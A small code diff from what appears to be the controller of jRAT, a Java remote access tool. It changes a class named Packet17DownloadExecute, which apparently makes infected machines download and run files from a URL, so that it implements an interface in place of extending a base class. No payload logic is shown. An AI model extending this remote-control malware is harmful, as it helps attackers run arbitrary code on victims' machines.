@@ -5,7 +5,7 @@ import jrat.controller.Slave;
 import java.io.File;
 
 
-public class Packet17DownloadExecute extends AbstractOutgoingPacket {
+public class Packet17DownloadExecute implements OutgoingPacket {
 
 	private String url;
 	private String filetype;
